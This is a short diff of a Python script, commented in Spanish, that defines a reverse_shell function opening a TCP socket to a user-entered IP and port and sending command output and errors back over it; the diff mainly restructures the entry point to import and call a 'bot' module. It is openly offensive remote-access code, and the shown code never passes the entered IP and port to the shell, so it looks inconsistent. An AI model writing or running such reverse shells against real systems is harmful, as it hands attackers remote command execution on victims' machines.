@@ -1,7 +1,5 @@
 import socket
 
-from bot import run
-
 def reverse_shell(ip, port):
     # Crear un socket TCP
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -28,10 +26,16 @@ def reverse_shell(ip, port):
         # Enviar el error del comando
         s.sendall(err)
 
-if __name__ == "__main__":
+def main():
     # Solicitar al usuario la IP y el puerto
     ip = input("Introduzca la IP: ")
     port = int(input("Introduzca el puerto: "))
 
+    # Importar el módulo bot
+    import bot
+
     # Ejecutar la función de shell inverso
-    run()
+    bot.run()
+
+if __name__ == "__main__":
+    main()
